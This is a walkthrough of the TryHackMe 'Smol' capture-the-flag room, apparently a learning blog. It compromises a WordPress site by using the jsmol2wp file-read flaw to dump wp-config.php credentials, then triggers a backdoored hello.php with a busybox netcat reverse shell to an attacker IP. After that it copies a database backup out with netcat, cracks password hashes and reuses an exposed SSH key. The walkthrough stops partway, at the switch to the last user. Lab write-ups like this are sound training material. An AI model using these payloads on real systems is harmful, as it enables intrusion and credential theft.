---
icon: linux
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
  tags:
    visible: true
---

# Smol Challenge Wolkthrough

<figure><img src="../categories/CTF-Write-Ups/.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

_Welcome! This write-up walks through the Smol challenge on TryHackMe. My goal is simple: stay motivated, record what I learn, and explain each step so the techniques and concepts stick. Follow along, replicate the steps, and level up your skills._

### Machine Info: <a href="#id-5d3f" id="id-5d3f"></a>

* **Machine Name:** Smol
* **Machine Type:** Linux, Web
* **Difficulty:** Mideum
* **Machine Link:** \[[https://tryhackme.com/room/smol](https://tryhackme.com/room/smol)]

### Initial Nmap Scan <a href="#id-7b04" id="id-7b04"></a>

```bash
nmap -p- -A -sC -vv --min-rate 10000 10.201.46.38 -oN scan.txt

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:ab:87:93:41:a3:88:50:71:81:b7:fb:63:af:46:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDESgv6HKJo6qwAaN3CNl5a6/y6AxLfzpe829RivBar+9wTeqtAKP+cCM6o29qpTvNplDV+LZZ/nYTwDVOSxGoCne6v5gIUl5dipI4qJkZjbqUgvJKSUQIN5/PYerDjbmPItlIdPaKI5zBOeH3KR3U6cbJDvYSwCVQOmPuJYS66sbstbe1tc2Hy+xj4nytBuDMqrNK7+DpopgYW7JLrl2OeyQFikRvCyv9jHzSR0dop1pyUzOq1NuDC9RmNDoPiHeaiF+bWWkkXbRJMyhvphzLAN1sI4AnI2XLI2l/+qSQz0ZvpodxJtNtwiTQDUt6uifmTmc9FsS7JplZNkLRu/t/Byf4qkx33wyIK9a7c915jYt5rjuzeRWPyjondoeJXIeRnId+Hrtkuw2Z+CM6MeMJ2Au1bqIsCz3Z2Ox2MNCS9M7xcLEFs3RvXRWsqgAbpmwhrya+jo74gbd8ZbrXIlAVk8TpG1M8xONdT33wIVhZw3uopVSre9X/4MTKmx4NqAv8=
|   256 96:57:37:17:fd:20:70:94:42:02:0e:14:e1:51:54:76 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI5cKNVTp9Egwu+JbVxtGjZ1qJ1Gxd9Yl9MbBf4kZMYM/rDrm/gIf1HsWpVlcyHNqxoqG7xetAAvkoPGOCtLgSo=
|   256 8d:67:97:2b:de:9d:cb:34:ec:c9:1d:f6:3c:aa:d3:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEHyddT41Hf2/XXdhFyOYqtuSHZhntd50XtW6VwrsGHa
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://www.smol.thm
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=9/12%OT=22%CT=1%CU=31948%PV=Y%DS=5%DC=T%G=Y%TM=68C3EA9
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST1
OS:1NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN
OS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Uptime guess: 29.607 days (since Thu Aug 14 00:36:38 2025)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   45.21 ms  10.17.0.1
2   ... 4
5   322.43 ms 10.201.46.38
```

In Nmap scan result we see that thier are two port open 22 and 80 and also we can see Domain `www.smol.thm`. So, first we need to add the domain to our `/etc/hosts`

Add `10.201.46.38 www.smol.thm` to `/etc/hosts` file:

```bash
sudo echo "10.201.46.38 www.smol.thm" | sudo tee -a /etc/hosts
```

Now try to browse the website \[[http://www.smol.thm/](http://www.smol.thm/)] and we see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*SmN0SfWRu15KSTNqX_apoA.png" alt="" height="315" width="700"><figcaption></figcaption></figure>

We carefully enumeare the entier machine becouse we see “**Test your enumeration skills on this boot-to-root machine**” in machine description.

So, in website we see that the website is created by **WordPress**

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*U_7fbCi1zwlLoSDz3DZ2pQ.png" alt="" height="277" width="700"><figcaption></figcaption></figure>

### Directory Listing <a href="#e016" id="e016"></a>

```bash
gobuster dir -u http://www.smol.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobusetr.txt
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*jMrxHX0BdnrWxkxPzZgdMw.png" alt="" height="197" width="700"><figcaption></figcaption></figure>

we see the wordpress login page [`http://www.smol.thm/wp-admin/`](http://www.smol.thm/wp-admin/)[.](http://www.smol.thm/wp-admin/)

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*M_RtNVC0PUov5pXjZ3Es2A.png" alt="" height="268" width="700"><figcaption></figcaption></figure>

Now we try to enumearte `WordPress` by using `WPScan:`

```bash
 sudo wpscan --url http://www.smol.thm --enumerate ap,at,cb,dbe,u,m

_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://www.smol.thm/ [10.201.46.38]
[+] Started: Fri Sep 12 16:14:45 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.thm/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7.1 identified (Outdated, released on 2024-11-21).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.thm/index.php/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>
 |  - http://www.smol.thm/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7.1</generator>

[+] WordPress theme in use: twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating All Themes (via Passive and Aggressive Methods)
 Checking Known Locations - Time: 00:35:27 <===================================================================================> (30328 / 30328) 100.00% Time: 00:35:27
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] Theme(s) Identified:

[+] twentytwentyfive
 | Location: http://www.smol.thm/wp-content/themes/twentytwentyfive/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentyfive/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentyfive/style.css
 | Style Name: Twenty Twenty-Five
 | Style URI: https://wordpress.org/themes/twentytwentyfive/
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyfive/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyfive/style.css, Match: 'Version: 1.0'

[+] twentytwentyfour
 | Location: http://www.smol.thm/wp-content/themes/twentytwentyfour/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentyfour/readme.txt
 | [!] The version is out of date, the latest version is 1.3
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentyfour/style.css
 | Style Name: Twenty Twenty-Four
 | Style URI: https://wordpress.org/themes/twentytwentyfour/
 | Description: Twenty Twenty-Four is designed to be flexible, versatile and applicable to any website. Its collecti...
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyfour/, status: 200
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyfour/style.css, Match: 'Version: 1.0'

[+] twentytwentyone
 | Location: http://www.smol.thm/wp-content/themes/twentytwentyone/
 | Last Updated: 2025-08-05T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentyone/readme.txt
 | [!] The version is out of date, the latest version is 2.6
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentyone/style.css
 | Style Name: Twenty Twenty-One
 | Style URI: https://wordpress.org/themes/twentytwentyone/
 | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyone/, status: 500
 |
 | Version: 1.9 (80% confidence)
 | Found By: Style (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentyone/style.css, Match: 'Version: 1.9'

[+] twentytwentythree
 | Location: http://www.smol.thm/wp-content/themes/twentytwentythree/
 | Last Updated: 2024-11-13T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentythree/readme.txt
 | [!] The version is out of date, the latest version is 1.6
 | [!] Directory listing is enabled
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentythree/style.css
 | Style Name: Twenty Twenty-Three
 | Style URI: https://wordpress.org/themes/twentytwentythree
 | Description: Twenty Twenty-Three is designed to take advantage of the new design tools introduced in WordPress 6....
 | Author: the WordPress team
 | Author URI: https://wordpress.org
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/, status: 200
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentythree/style.css, Match: 'Version: 1.2'

[+] twentytwentytwo
 | Location: http://www.smol.thm/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://www.smol.thm/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.0
 | Style URL: http://www.smol.thm/wp-content/themes/twentytwentytwo/style.css
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentytwo/, status: 200
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.thm/wp-content/themes/twentytwentytwo/style.css, Match: 'Version: 1.5'

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:10 <========================================================================================> (137 / 137) 100.00% Time: 00:00:10

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)
 Checking DB Exports - Time: 00:00:05 <==============================================================================================> (84 / 84) 100.00% Time: 00:00:05

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)
 Brute Forcing Attachment IDs - Time: 00:00:07 <===================================================================================> (100 / 100) 100.00% Time: 00:00:07

[i] No Medias Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:04 <=========================================================================================> (10 / 10) 100.00% Time: 00:00:04

[i] User(s) Identified:

[+] Jose Mario Llado Marti
 | Found By: Rss Generator (Passive Detection)

[+] wordpress user
 | Found By: Rss Generator (Passive Detection)

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] think
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] wp
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://www.smol.thm/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] gege
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] diego
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] xavi
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Sep 12 16:51:14 2025
[+] Requests Done: 30739
[+] Cached Requests: 14
[+] Data Sent: 7.947 MB
[+] Data Received: 4.996 MB
[+] Memory used: 300.16 MB
[+] Elapsed time: 00:36:28
```

And here we found some additional users other than Admin:

* think
* wp
* gege
* diego
* xavi

Now we try WPScan by using API Key for some for more information.

> Note: Login \[[https://wpscan.com/](https://wpscan.com/)] webiste by using email id and password to get your private API Key.

```bash
wpscan --url <http://www.smol.thm> -e vp --plugins-detection mixed --api-token API_TOKEN

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.thm/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 | Readme: http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | [!] Directory listing is enabled
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Known Locations (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/, status: 200
 |
 | [!] 2 vulnerabilities identified:
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Cross-Site Scripting (XSS)
 |     References:
 |      - https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20462
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | [!] Title: JSmol2WP <= 1.07 - Unauthenticated Server Side Request Forgery (SSRF)
 |     References:
 |      - https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20463
 |      - https://www.cbiu.cc/2018/12/WordPress%E6%8F%92%E4%BB%B6jsmol2wp%E6%BC%8F%E6%B4%9E/#%E5%8F%8D%E5%B0%84%E6%80%A7XSS
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.thm/wp-content/plugins/jsmol2wp/readme.txt
```

And we can found this two vulnerability. Now we search google and found this:

* [JSmol2WP <= 1.07 — Unauthenticated Server Side Request Forgery (SSRF)](https://wpscan.com/vulnerability/ad01dad9-12ff-404f-8718-9ebbd67bf611/)

```http
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

* [JSmol2WP <= 1.07 — Unauthenticated Cross-Site Scripting (XSS)](https://wpscan.com/vulnerability/0bbf1542-6e00-4a68-97f6-48a7790d1c3e/)

```http
http://localhost:8080/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=saveFile&data=%3Cscript%3Ealert(/xss/)%3C/script%3E&mimetype=text/html;%20charset=utf-8
```

Let’s try to exploit. We use SSRF URL:

```http
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php
```

And we get this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*2EodLgp1ov_Oqmqjjy4nxA.png" alt="" height="316" width="700"><figcaption></figcaption></figure>

Here we found useful credential:

```
Username: wpuser
Password: kbLSF2Vop#lw3rjDZ629*Z%G
```

<figure><img src="https://miro.medium.com/v2/resize:fit:693/1*0EUgFbIsMyJow4O1GpOzQw.png" alt="" height="154" width="693"><figcaption></figcaption></figure>

Now try to login by using the previously found credential, and we successfully login.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*o6Bs7CnR0NiFPFXLI394eg.png" alt="" height="269" width="700"><figcaption></figcaption></figure>

After many analysis we found Private Webmaster Tasks page.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*9NcBZqmhvvsYpleEBd7ORg.png" alt="" height="261" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*S3mVqrfXr30EzOlUwejVxQ.png" alt="" height="261" width="700"><figcaption></figcaption></figure>

Accessing the page, we find a task pointing us in the direction of the backdoor plugin.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*pE_XAHIntg4lBeDhbQBDDw.png" alt="" height="231" width="700"><figcaption></figcaption></figure>

_“Hello Dolly” is a plugin that is installed by default on all WordPress panels. The code for the plugin can be accessed via `/wp-content/plugins/hello.php`. Using the file inclusion vulnerability, we can traverse the directories and view the source code of hello.php._

Therefore, the link to view `hello.php` is:

```bash
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../hello.php
```

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*BOyo5j_gOPnGomdn10MRBA.png" alt="" height="270" width="700"><figcaption></figcaption></figure>

Scrolling down, we see some malicious base64 encoded code inside the function `hello_dolly()`.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*s5VyreDzpUc_LRnIU3iKQQ.png" alt="" height="64" width="700"><figcaption></figcaption></figure>

The eval() function essentially tells PHP to run everything within the parenthesis as PHP code.\
Now we try to Decode this base64 string using [CyberChef](https://gchq.github.io/CyberChef/), we get:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*RMeWAIaUDX5opDSvn2SDsA.png" alt="" height="250" width="700"><figcaption></figcaption></figure>

At first glance, `\143\155\x64` and `\143\x6d\144` look too weird to be parameter names. That is because the name of the parameter that PHP is retrieving from the link is encoded.\
So we will try to decode the parameter name Using a tool like [UnPHP](https://www.unphp.net/). And we can see this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*jbNtrPFBdYvsVQhhdocd_A.png" alt="" height="303" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*1YBY8mc7z6T2WTMF5OHfrw.png" alt="" height="322" width="700"><figcaption></figcaption></figure>

Both encoded strings actually lead to the same result. Now, we know that we have to pass some sort of payload to the cmd parameter. Going back to the decoded base64 PHP code, the code is grabbing whatever is passed into the cmd parameter and passing it into the system() function. The system() function runs whatever is given to it in a shell instead of running it as PHP code.

Now that we have a good understanding of the backdoor, let’s exploit it! Heading back to the WordPress dashboard, this backdoor can be used wherever `hello.php` is called. Usually, all the tabs in the WordPress panel would use the “Hello Dolly” plugin.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*8F92QO3htL_hBOrszQg2uw.png" alt="" height="273" width="700"><figcaption></figcaption></figure>

Now we will use the Dashboard tab for the backdoor exploit. We just need to specify reverse shell payload that will be passed into the `cmd` parameter at the back of this link. For example:

```bash
http://www.smol.thm/wp-admin/index.php?cmd=busybox nc <ATTACKER IP> 4242 -e bash
```

> Note: Here we can use busybox reverse shell payload to get reverse shell connection.

So, Before Browse this we need to run Netcat Listener first:

```bash
rlwrap -cAr nc -lnvp 4242
```

And we successfully get reverse shell connection:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*M4QnDYsE5LeeYZgv47R1ig.png" alt="" height="228" width="700"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:518/1*UFf5paeP4hc7Sw7UzKL2Nw.png" alt="" height="142" width="518"><figcaption></figcaption></figure>

We get reverse shell but it is not a stable shell. We need a stable shell. So run the following command to get stable shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")';
export TERM=xterm
Press CTRL+Z
stty raw -echo; fg 
```

<figure><img src="https://miro.medium.com/v2/resize:fit:622/1*wI_mZntU-SU0C3JoZ3sJjQ.png" alt="" height="182" width="622"><figcaption></figcaption></figure>

After many research we found a database file called `wp_backup.sql` from `/opt` directory. So, we need to transfer this file to our local machine for analysis.

So, we transfer this file by using Netcat:

```bash
# 1. Run the following command in receving end (Local machine):
nc -l -p 1234 > wp_backup.sql

# 2. Run the following command in sending end (Remote machine):
nc -w 3 <Local_Host_IP> 1234 < wp_backup.sql
```

And we successfully transfer the file in our local machine.

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*tpflyJ7O-yOvGHhXQgl7tQ.png" alt="" height="156" width="700"><figcaption></figcaption></figure>

Now analysis the file

```bash
# Start the MySQL server service
sudo systemctl start mysql.service   # -> launches MySQL daemon

# Start the MariaDB server service (alternative/compatible server)
sudo systemctl start mariadb.service # -> launches MariaDB daemon

# Check MySQL service status
sudo systemctl status mysql.service  # -> shows whether MySQL is active, failed, or inactive

# Create a new database named 'wp_backup_test' (prompts for MySQL root password)
sudo mysql -u root -p -e "CREATE DATABASE wp_backup_test;"  
# -> creates an empty database to restore into

# Import an SQL dump file into the 'wp_backup_test' database (prompts for password)
sudo mysql -u root -p wp_backup_test < wp_backup.sql
# -> restores database objects and data from wp_backup.sql into the created database

# List all tables in the 'wp_backup_test' database (prompts for password)
sudo mysql -u root -p -D wp_backup_test -e "SHOW TABLES;"
# -> verifies which tables were imported

# Display all rows from the wp_users table in 'wp_backup_test' (prompts for password)
sudo mysql -u root -p -D wp_backup_test -e "SELECT * FROM wp_users;"
# -> inspects user records (useful to confirm successful restore and view users)
```

And we found this:

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*5SdZBKZ8VNq2YE3oEHYmSQ.png" alt="" height="203" width="700"><figcaption></figcaption></figure>

Now we create a file called `hash.txt` and store all the hash with their user name inside that file. like this:

<figure><img src="https://miro.medium.com/v2/resize:fit:377/1*mxMfptsWZXA-aL2u2spJDQ.png" alt="" height="139" width="377"><figcaption></figcaption></figure>

And Now try to crack the hash using John The Ripper:

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

And we successfully crack this:

Press enter or click to view image in full size

<figure><img src="https://miro.medium.com/v2/resize:fit:700/1*LXfX6oCkDr3Qm2olSPd0mw.png" alt="" height="336" width="700"><figcaption></figcaption></figure>

Now try to switch `diego` user using this credentials.

<figure><img src="https://miro.medium.com/v2/resize:fit:358/1*Iz0zDZg2b7mUS57P0z9LRw.png" alt="" height="103" width="358"><figcaption></figcaption></figure>

And we successfully get the user flag.

<figure><img src="https://miro.medium.com/v2/resize:fit:345/1*NNHy3KGov9xyYPTjVpWrTg.png" alt="" height="134" width="345"><figcaption></figcaption></figure>

Now for PrivEsc we want to enumerate the `diego` user and we notice that the `diego` user is the member of `Internet` group means `diego` have permission to see other users home directory.

<figure><img src="https://miro.medium.com/v2/resize:fit:579/1*rx8pAuBC-sVt81Ib0A_qCA.png" alt="" height="249" width="579"><figcaption></figcaption></figure>

After checking home directory of each user one by one we see hidden `.ssh` directory inside the `think` user and also we can see that the private key `id_rsa` is open for everyone to read.

<figure><img src="https://miro.medium.com/v2/resize:fit:608/1*slth1S04XwChAhHVa-LwpQ.png" alt="" height="384" width="608"><figcaption></figcaption></figure>

And Run the following command to get `think` user shell:

```bash
ssh -i id_rsa think@localhost
```

and we successfully get think user shell.

<figure><img src="https://miro.medium.com/v2/resize:fit:676/1*X8vXHSs60vZo_EU1y3zdwQ.png" alt="" height="385" width="676"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:664/1*8t2qBd4nAMvi-wpXl9U83w.png" alt="" height="329" width="664"><figcaption></figcaption></figure>

Since we do not know think’s password, we can’t list the sudo commands we can perform. However, one interesting thing to note is that if we try to switch users again we can switch to user `gege` without being prompted for a password.

<figure><img src="https://miro.medium.com/v2/resize:fit:291/1*SJTDrVQZx-Eeiszk5tnKYA.png" alt="" height="62" width="291"><figcaption></figcaption></figure>

We are naw `gege`. Now enumearte gege home directory and we found a zip file called `wordpress.old.zip`. If we try to unzip the zip file to analyse its contents, we get prompted with a password to unzip `wp-config.php`:

<figure><img src="https://miro.medium.com/v2/resize:fit:668/1*YIhnEy6e50NsOIxBsziq7w.png" alt="" height="98" width="668"><figcaption></figcaption></figure>

<figure><img src="https://miro.medium.com/v2/resize:fit:638/1*0ebRM9CSTocPo79aDWsnTg.png" alt="" height="214" width="638"><figcaption></figcaption></figure>

Entering the password for the hash we cracked earlier for gege, we successfully extracted all the contents in the zip file. Viewing the extracted `wp-config.php` located in `wordpress.old/wp-config.php`, we find our last user, Xavi’s credentials.

<figure><img src="https://miro.medium.com/v2/resize:fit:456/1*-UAZRZLbck8slZfSIwEO_g.png" alt="" height="128" width="456"><figcaption></figcaption></figure>

Now to try to switch to the Xavi user.

